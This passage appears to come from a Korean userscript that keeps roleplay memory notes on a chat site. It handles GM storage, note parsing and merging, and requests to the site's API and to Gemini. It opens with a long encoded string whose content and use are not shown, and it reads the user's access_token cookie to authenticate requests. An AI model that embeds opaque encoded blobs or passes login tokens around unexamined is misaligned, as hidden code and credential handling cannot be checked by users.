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');

  // ══════════════════════════════════════════════════════════════
  // 3. 확장 프로그램 호환 (탬퍼몽키: GM_*, 아이폰 Userscripts 앱: GM.*)
  // ══════════════════════════════════════════════════════════════
  const hasGM = typeof GM !== 'undefined' && GM;
  const gmRequest = typeof GM_xmlhttpRequest === 'function' ? GM_xmlhttpRequest
    : (hasGM && GM.xmlHttpRequest ? opts => GM.xmlHttpRequest(opts) : null);
  async function getValue(key, fallback) {
    if (typeof GM_getValue === 'function') return GM_getValue(key, fallback);
    if (hasGM && GM.getValue) return GM.getValue(key, fallback);
    try { const v = localStorage.getItem('memo-note:' + key); return v === null ? fallback : v; } catch (_) { return fallback; }
  }
  // ETC(커뮤·폰 등) 저장값이 바뀌면 etcHook을 불러요. 동기화가 켜져 있을 때만 쓰고, 불러오기·비우기 중에는 멈춰요(etcQuiet).
  const ETC_KEY = /^(board|phone|pc|news|wiki|live|quotes|etcnames):/;
  let etcHook = null, etcQuiet = false;
  async function setValue(key, value) {
    if (!etcQuiet && etcHook && ETC_KEY.test(key)) setTimeout(() => etcHook(key), 0);
    if (typeof GM_setValue === 'function') return GM_setValue(key, value);
    if (hasGM && GM.setValue) return GM.setValue(key, value);
    try { localStorage.setItem('memo-note:' + key, value); } catch (_) {}
  }

  // ══════════════════════════════════════════════════════════════
  // 4. 유틸 · 네트워크
  // ══════════════════════════════════════════════════════════════
  const msgId = m => String(m?._id || m?.id || m?.messageId || '');
  const msgRole = m => String(m?.role || m?.speaker || '');
  const msgText = m => (typeof m?.content === 'string' && m.content) || (typeof m?.message === 'string' && m.message) || '';
  const isChat = m => ['user', 'assistant'].includes(msgRole(m));
  const fmt = n => Number(n || 0).toLocaleString('ko-KR');
  const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
  const bullet = l => String(l).replace(/^\s*[-•]\s*/, '').trim();
  const isNone = l => /^[-•]?\s*없음\.?$/.test(String(l).trim());

  function chatIdFromPath() {
    const p = location.pathname;
    const m = p.match(/^\/stories\/[^/]+\/episodes\/([^/?#]+)/) ||
              p.match(/^\/characters\/[^/]+\/chats\/([^/?#]+)/) ||
              p.match(/^\/u\/[^/]+\/c\/([^/?#]+)/);
    return m ? m[1] : null;
  }
  function token() {
    const c = document.cookie.split(';').map(s => s.trim()).find(s => s.startsWith('access_token='));
    if (!c) throw new Error('크랙 로그인 정보를 찾지 못했어요. 로그인 후 새로고침해 주세요.');
    return decodeURIComponent(c.slice('access_token='.length));
  }
  // 글 그대로 받는 요청(Gemini 스트리밍용)
  function requestRaw(method, url, { body, headers = {}, timeout = 30000, onProgress } = {}) {
    return new Promise((resolve, reject) => {
      if (!gmRequest) { reject(new Error('확장 프로그램이 외부 요청을 허용하지 않았어요.')); return; }
      gmRequest({ method, url, timeout, headers: { 'Content-Type': 'application/json', ...headers }, data: body === undefined ? undefined : JSON.stringify(body),
        onprogress: r => { try { onProgress?.(r?.responseText || ''); } catch (_) {} },
        onload: r => { if (r.status >= 200 && r.status < 300) return resolve(r.responseText || '');
          let msg = ''; try { const j = JSON.parse(r.responseText); msg = (Array.isArray(j) ? j[0] : j)?.error?.message || ''; } catch (_) {}
          reject(new Error(`HTTP ${r.status}${msg ? ' · ' + msg : ''}`)); },
        ontimeout: () => reject(new Error('응답 시간이 초과됐어요.')), onerror: () => reject(new Error('네트워크 요청에 실패했어요.')) });
    });
  }
  function request(method, url, { body, headers = {}, timeout = 30000 } = {}) {
    return new Promise((resolve, reject) => {
      if (!gmRequest) { reject(new Error('확장 프로그램이 외부 요청을 허용하지 않았어요.')); return; }
      gmRequest({
        method, url, timeout,
        headers: { 'Content-Type': 'application/json', Accept: 'application/json', ...headers },
        data: body === undefined ? undefined : JSON.stringify(body),
        onload: r => {
          let data = null;
          try { data = r.responseText ? JSON.parse(r.responseText) : null; } catch (_) {}
          if (r.status >= 200 && r.status < 300) resolve(data);
          else reject(new Error(`HTTP ${r.status}${data?.error?.message ? ' · ' + data.error.message : ''}`));
        },
        ontimeout: () => reject(new Error('응답 시간이 초과됐어요.')),
        onerror: () => reject(new Error('네트워크 요청에 실패했어요.')),
      });
    });
  }
  const crack = (method, url, body) =>
    request(method, url, { body, headers: { Authorization: 'Bearer ' + token(), platform: 'web' } });

  // ══════════════════════════════════════════════════════════════
  // 5. 노트 읽기·쓰기 · 칸 나누기
  // ══════════════════════════════════════════════════════════════
  // 괄호는 마크다운 주석을 닫아 버리므로 전각 괄호로 바꿔 넣고, 읽을 때 되돌립니다.
  const safe = s => String(s).replace(/\(/g, '（').replace(/\)/g, '）').replace(/[\r\n]+/g, ' ');
  const unsafe = s => String(s).replace(/（/g, '(').replace(/）/g, ')');

  function parseNote(message) {
    const text = msgText(message);
    const v3 = text.match(V3_RE);
    if (v3) {
      const lines = v3[v3.length - 1].replace(/^\n+/, '').split('\n');
      const head = lines[0].replace(/^\[\/\/\]: # "/, '');
      const get = k => (head.match(new RegExp(k + '=([^\\s"]+)')) || [])[1] || '';
      const body = lines.slice(1, -1).map(l => l.replace(/^ {4}/, '')).filter(l => !/^\[기억 노트 ·|^※ /.test(l)).join('\n');
      return { carrierId: msgId(message), upto: get('upto'), turns: Number(get('turns')) || 0, at: get('at'), by: get('by').replace(/_/g, ' '), memory: body.trim() };
    }
    const v2 = text.match(V2_RE);
    if (v2) {
      const lines = v2[v2.length - 1].split('\n').map(l => (l.match(LINE_RE) || [])[1]).filter(l => l !== undefined);
      const head = lines[0] || '';
      const get = k => (head.match(new RegExp(k + '=([^\\s]+)')) || [])[1] || '';
      const body = lines.slice(1, -1).filter(l => !/^기억 노트 ·/.test(l)).map(unsafe).join('\n');
      return { carrierId: msgId(message), upto: get('upto'), turns: Number(get('turns')) || 0, at: get('at'), memory: body.trim() };
    }
    const start = text.lastIndexOf('<!--MEMO_NOTE');
    const end = start >= 0 ? text.indexOf('MEMO_NOTE_END-->', start) : -1;
    if (start < 0 || end < 0) return null;
    const raw = text.slice(start + '<!--MEMO_NOTE'.length, end);
    const head = raw.split('\n')[0];
    const get = k => (head.match(new RegExp(k + '=([^\\s]+)')) || [])[1] || '';
    return { carrierId: msgId(message), upto: get('upto'), turns: Number(get('turns')) || 0, at: get('at'),
             memory: raw.split('\n').slice(1).join('\n').replace(/^\[기억 노트[^\n]*\]\n?/, '').trim() };
  }

  // 확인용 내용은 채팅 노트에 넣지 않고 이 브라우저에만 보관합니다. AI 기억엔 필요 없고 매 턴 읽는 글만 늘어나요.
  //   근거·번역 줄, 끝난 서사 고리 줄, 명대사 칸
  //   감정선·소지품 내력은 넣습니다: 폰↔컴을 오가며 정리해도 채팅 노트에서 이어 받게(이 브라우저에만 두면 다른 기기에서 정리할 때 사라짐).
  const PROOF_LINE = /^\s*-?\s*(?:(?:근거|번역)\s*[:：]|\[닫힘\])/;
  const VIEW_ONLY = ['명대사'];
  //   인물 칸의 프로필 줄(동물 이모지·특징)은 화면 표시용이고, 유저 캐릭터 블록은 유저 프로필이 따로 들어가니 뺍니다.
  // 글 맨 앞(또는 [ 뒤)의 날짜 "2027.09.14" · "1년차 03.14"만 꺼냅니다. 범위(~)·미상은 ''.
  const dayOf = t => { const m = String(t).replace(/^\[/, '').match(/^((?:\d+년차\s*)?\d{1,4}[./]\d{1,2}(?:[./]\d{1,2})?)(?![\d./])(?!\s*~)/); return m ? m[1].replace(/\s+/g, ' ') : ''; };
  function stripProof(memory) {
    const users = new Set(personsIn(splitSections(memory).find(x => x.key === '인물')?.body || '').filter(x => x.isUser).map(x => x.name));
    const logT = blocksOf(splitSections(memory).find(x => x.key === '날짜로그')?.body || '')
      .filter(b => !/\(요약\)/.test(b.title)).map(b => (b.title.match(/-\s*(.+?)\]?$/) || [])[1]).filter(t => t && t.length >= 4).map(t => t.replace(/\s/g, ''));
    const logEv = blocksOf(splitSections(memory).find(x => x.key === '날짜로그')?.body || '').filter(b => !/\(요약\)/.test(b.title))
      .map(b => ({ date: dayOf(b.title), all: b.title + ' ' + b.lines.join(' ') }));
    const inLog = (item, name) => { const d = dayOf(item); return !!d && !!name && logEv.some(e => e.date === d && personAlias(name).some(a => e.all.includes(a))); };
    let skip = false, sec = '', who = '', mine = false, at = '';
    const kept = String(memory).split('\n').filter(l => {
      const h = l.match(/^(?:##(?!#)|■)\s*(.+?)\s*$/);
      if (h) { skip = VIEW_ONLY.includes(h[1]); at = ALIAS[h[1]] || h[1]; mine = false; }
      // 유저 캐릭터 블록·프로필 줄(동물 이모지·유저 표시)도 넣습니다: 폰↔컴 어디서 봐도 인물 목록·이모지가 같게.
      return !skip && !PROOF_LINE.test(l);
    }).map(l => {
      // 인물 칸의 "→ 유진:"(누가 부르는지 빠진 예전 줄)에 이름을 채워 "서윤 → 유진:"으로. AI가 주어를 헷갈리지 않게.
      const h = l.match(/^(?:##(?!#)|■)\s*(.+?)\s*$/);
      if (h) { sec = h[1]; who = ''; return l; }
      if (sec !== '인물') return l;
      // "함께한 일"에서 날짜로그에 아직 그대로 있는 사건은 빼고 넣습니다(같은 제목 두 번 X). (요약)으로 묶여 사라진 사건만 남아요. 화면엔 그대로.
      const ws = l.match(/^(\s*-?\s*함께한 일\s*[:：]\s*)(.+)$/);
      //   같은 날짜에 이 인물이 나오는 사건이 날짜로그에 있으면 그 사건이 같은 일이라 봅니다(AI가 제목을 다른 말로 줄여 써도 걸러지게).
      if (ws) { const left = ws[2].split(/\s+·\s+/).filter(x => !logT.some(t => x.replace(/\s/g, '').includes(t)) && !inLog(x, who)); return left.length ? ws[1] + left.join(' · ') : ''; }
      const p = l.trim().match(/^【(.+?)】/); if (p) who = p[1].trim();
      return who ? l.replace(/^(\s*)(?:→|->)\s*/, `$1${who} → `) : l;
    }).join('\n');
    // "- 없음" 줄과 빈 칸은 빼고, 칸 순서는 늘 같게(SECTIONS 순서) 맞춥니다.
    const order = k => { const i = SECTIONS.findIndex(x => x.key === k); return i < 0 ? 99 : i; };
    return splitSections(kept)
      // 같은 칸 안에서 글자까지 똑같은 줄은 하나만 남깁니다.
      .map(x => ({ key: x.key, body: x.body.split('\n').filter(l => !isNone(l)).filter((l, i, a) => !l.trim() || a.indexOf(l) === i)
        // 내용 없이 제목만 남은 ▸ 소제목도 뺍니다.
        .filter((l, i, a) => !/^\s*(▸|###)/.test(l) || (a[i + 1] !== undefined && !/^\s*(▸|###)/.test(a[i + 1]) && a[i + 1].trim()))
        .join('\n').trim() }))
      .map(x => x.key === '감정선' ? { key: x.key, body: compactFeels(x.body) } : x)
      .filter(x => x.body)
      .sort((a, b) => order(a.key) - order(b.key))
      .map(x => `■ ${x.key}\n${x.body}`).join('\n');
  }
  // 감정선은 채팅에 ★ 전환점과 가장 최근 단계만 넣습니다(중간 단계를 줄줄이 읽으면 감정을 과하게 끌어올려서).
  //   전체 기록은 화면·이 기기 전체본·백업에 그대로 있어요.
  function compactFeels(body) {
    const out = []; let block = [];
    const flush = () => { if (!block.length) return; const [head, ...rest] = block, steps = rest.filter(l => /\|/.test(l));
      const lastStep = steps[steps.length - 1], keep = rest.filter(l => !/\|/.test(l) || /★/.test(l) || l === lastStep);
      out.push(head, ...keep); block = []; };
    for (const l of String(body).split('\n')) { if (/^\s*▸/.test(l)) flush(); block.push(l); }
    flush();
    return out.join('\n').trim();
  }
  // 정리한 기기 이름(노트 첫 줄 by=). 홈의 "마지막 정리"에 보여서 어느 기기 노트가 최신인지 알 수 있어요.
  const DEVICE = /iPhone/.test(navigator.userAgent) ? '아이폰' : /iPad/.test(navigator.userAgent) ? '아이패드' : /Android/.test(navigator.userAgent) ? '안드로이드'
    : (/Macintosh/.test(navigator.userAgent) && navigator.maxTouchPoints > 1) ? '아이패드' : /Macintosh/.test(navigator.userAgent) ? '맥' : '컴퓨터';
  function buildBlock(memory, uptoId, turns, at = new Date().toISOString(), by = DEVICE) {
    // 빈 줄이 있으면 덩어리가 끊기고, 곧은 큰따옴표는 덩어리를 닫아 버려서 둥근 따옴표로 바꿉니다.
    const clean = l => l.replace(/"([^"]*)"/g, '“$1”').replace(/"/g, '”');
    const lines = stripProof(memory).split('\n').map(l => clean(l.trimEnd())).filter(l => l.trim());
    return '\n\n' + [
      `[//]: # "MEMO_NOTE v3 upto=${uptoId} turns=${turns} at=${at}${by ? ` by=${String(by).replace(/[\s"]/g, '_')}` : ''}`,
      // 안내는 짧은 줄 여러 개로. 첫 줄 뒤 안내 줄은 "※ "로 시작해 읽을 때 본문에서 뺍니다(parseNote).
      ...[`[기억 노트 · 1~${turns}턴 배경 자료] OOC — 지난 RP를 이어 가기 위한 참고 자료`,
        `※ 읽는 법: ■ 칸 · ▸ 항목 · 【이름】 인물 · 'A → B: 「호칭」·말투 · 태도' = A가 B를 그렇게 부르고 대함(반대 방향은 따로) · '전환' = 그 관계가 바뀐 계기와 그 뒤 태도 · '함께한 일' = 그 인물이 기억하는 지난 일 · '향후 계획' = 그 인물이 하려는 일 · '고민' = 그 인물이 지금 붙잡고 있는 걱정 · ■ 감정선 = 지난 감정 변화 기록(지금 감정은 인물 칸 → 줄이 기준) · '내력' = 그 물건이 거쳐 온 일 ·→ 줄 끝 괄호 = 그 인물이 자기 감정을 알아챘는지(자각=알아챔 / 무자각=본인은 아직 모름 / 부정=알면서 인정 안 함 / 숨김=알지만 티 안 냄). 무자각·부정은 그 상태 그대로 연기하고, 아직 모르는 마음을 아는 것처럼 말하지 않음`,
        `※ 프로필 줄 끝에 '유저(PC)'가 붙은 인물은 사용자가 직접 연기하는 캐릭터 — 그 인물의 대사·행동·속마음을 대신 쓰지 않음. 프로필 줄은 화면 표시용`,
        `※ 우선순위: 이후 채팅 대화 > 이 노트. 현재상태는 정리한 때의 값이라, 대화에서 바뀌었으면 대화를 따름`,
        `※ 아는 것: 인물은 자기가 아는 만큼만 말하고 행동함(이 노트를 읽은 것은 극중에서 알게 된 것이 아님). '모름'은 모르는 대로, '오해'는 믿는 대로, '의심'은 떠보기만, 소문 들음 ≠ 앎`,
        `※ 쓰는 법: 지금 장면에 맞는 것만 자연스럽게. 지난 일을 뜬금없이 꺼내거나 기록된 말을 그대로 되풀이하지 않음. 감정 기록은 매번 같은 반응을 하라는 뜻이 아님. 노트에 없는 지난 일은 확정하지 않음`,
        `※ 답변 형식·길이는 평소대로. 이 노트의 내용·형식을 답변에 옮기거나 언급하지 않음`,
        ...lines, 'MEMO_NOTE_END"'].map(l => '    ' + l),
    ].join('\n');
  }

  // "## 칸" 단위로 나눕니다. "### 소제목"은 칸 본문 안에 그대로 둡니다.
  function splitSections(memory) {
    const out = [];
    let cur = null;
    for (const line of String(memory || '').split('\n')) {
      const h = line.match(/^(?:##(?!#)|■)\s*(.+?)\s*$/);
      if (h) {
        const key = ALIAS[h[1]] || h[1];
        cur = out.find(s => s.key === key);
        if (!cur) { cur = { key, lines: [] }; out.push(cur); }
        continue;
      }
      if (!cur) { cur = { key: '메모', lines: [] }; out.push(cur); }
      cur.lines.push(line);
    }
    return out.map(s => ({ key: s.key, body: s.lines.join('\n').trim() }));
  }
  const joinSections = list => list.map(s => `■ ${s.key}\n${s.body.trim() || '- 없음'}`).join('\n');

  // 칸 본문 → 소제목 블록 [{title, lines[]}]
  function blocksOf(body) {
    const out = [];
    let cur = null;
    for (const raw of String(body || '').split('\n')) {
      const line = raw.trim();
      if (!line || isNone(line)) continue;
      const h = line.match(/^(?:###|▸)\s*(.+)$/);
      if (h) { cur = { title: h[1].trim(), lines: [] }; out.push(cur); continue; }
      if (!cur) { cur = { title: '', lines: [] }; out.push(cur); }
      cur.lines.push(bullet(line));
    }
    return out.filter(b => b.title || b.lines.length);
  }
  const itemsOf = body => blocksOf(body).flatMap(b => (b.title ? [b.title, ...b.lines] : b.lines));

  // 바뀐 것만 받은 답을 기존 노트에 끼워 넣습니다(단계별 정리).
  //   항목 = "▸ 제목" 블록 또는 "【이름】" 블록. 같은 제목이면 바꾸고, 새 제목이면 더하고, 제목 끝 "(삭제)"면 지웁니다.
  //   항목이 없는 칸(줄거리·서사 고리 등)은 칸째 바꿉니다. 답에 없는 칸·항목은 예전 그대로 둡니다.
  const itemKey = k => String(k).replace(/\s*\(삭제\)\s*$/, '').replace(/\s+/g, '');
  function itemBlocks(body) {
    const head = [], items = []; let cur = null;
    for (const l of String(body || '').split('\n')) {
      const t = l.trim(), h = t.match(/^▸\s*(.+)$/) || t.match(/^【(.+?)】/);
      if (h) { cur = { key: h[1], del: /\(삭제\)\s*$/.test(t), lines: [l] }; items.push(cur); continue; }
      (cur ? cur.lines : head).push(l);
    }
    return { head, items };
  }
  function mergeNote(base, delta) {
    const list = splitSections(base);
    // 채팅에 들어가는 크기가 한도의 90% 밑이면 날짜로그를 깎지 않습니다: (요약) 묶기는 통째로 무시하고, 기존 사건이 짧아지면 예전 글을 둡니다.
    const roomy = stripProof(base).length < NOTE_LIMIT * 0.9;
